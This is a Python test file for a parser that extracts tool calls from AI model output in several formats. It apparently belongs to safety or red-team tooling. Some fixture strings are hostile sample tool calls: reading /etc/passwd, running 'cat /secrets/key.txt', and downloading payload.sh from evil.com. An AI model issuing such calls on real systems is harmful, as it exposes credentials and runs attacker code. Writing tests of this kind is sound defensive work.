"""Tests for ToolCallParser multi-format extraction."""

from __future__ import annotations

from rtl.tools.parser import ToolCallParser


def test_parse_openai_format() -> None:
    text = 'Here is the call: {"function_call": {"name": "read_file", "arguments": "{\\"path\\": \\"/etc/passwd\\"}"}}'
    calls = ToolCallParser.parse(text)
    assert len(calls) >= 1
    call = next(c for c in calls if c["format"] == "openai")
    assert call["name"] == "read_file"
    assert call["arguments"] == {"path": "/etc/passwd"}


def test_parse_anthropic_format() -> None:
    text = 'I will check that for you.\n<tool_call tool="execute_bash">{"command": "cat /secrets/key.txt"}</tool_call>'
    calls = ToolCallParser.parse(text)
    assert len(calls) >= 1
    call = next(c for c in calls if c["format"] == "anthropic")
    assert call["name"] == "execute_bash"
    assert call["arguments"] == {"command": "cat /secrets/key.txt"}


def test_parse_json_code_blocks() -> None:
    # 1. Single tool object
    text_single = """```json
    {
        "tool": "query_database",
        "arguments": {"query": "SELECT * FROM users"}
    }
    ```"""
    calls = ToolCallParser.parse(text_single)
    assert any(c["name"] == "query_database" for c in calls)

    # 2. Tool calls array
    text_array = """```json
    {
        "tool_calls": [
            {
                "name": "send_email",
                "arguments": {"to": "admin@example.com", "subject": "alert"}
            }
        ]
    }
    ```"""
    calls_arr = ToolCallParser.parse(text_array)
    assert any(c["name"] == "send_email" for c in calls_arr)

    # 3. List of tools
    text_list = """```json
    [
        {"tool": "fetch_url", "arguments": {"url": "https://example.com/api"}}
    ]
    ```"""
    calls_list = ToolCallParser.parse(text_list)
    assert any(c["name"] == "fetch_url" for c in calls_list)


def test_parse_custom_format() -> None:
    text = 'Invoking tool now: TOOL_CALL: download_artifact(url="https://evil.com/payload.sh", dest="/tmp/p.sh")'
    calls = ToolCallParser.parse(text)
    assert len(calls) >= 1
    custom_call = next(c for c in calls if c["format"] == "custom")
    assert custom_call["name"] == "download_artifact"
    assert custom_call["arguments"]["url"] == "https://evil.com/payload.sh"


def test_parse_empty_and_benign_text() -> None:
    assert ToolCallParser.parse("") == []
    assert ToolCallParser.parse("I cannot assist with that request.") == []


def test_parse_openai_dict_and_tool_calls_format() -> None:
    # Pattern 2: raw dict in function_call
    text_dict = '{"function_call": {"name": "calculator", "arguments": {"expr": "2+2"}}}'
    calls_dict = ToolCallParser.parse(text_dict)
    assert any(c["name"] == "calculator" for c in calls_dict)

    # Pattern 3: tool_calls array
    text_tc = (
        '{"tool_calls": [{"id": "call_99", "type": "function", "function": '
        '{"name": "get_user", "arguments": "{\\"user_id\\": 42}"}}]}'
    )
    calls_tc = ToolCallParser.parse(text_tc)
    assert any(c["name"] == "get_user" and c["arguments"] == {"user_id": 42} for c in calls_tc)

    # Malformed json block handling
    malformed = "```json\n{not valid json}\n```"
    assert ToolCallParser.parse(malformed) == []
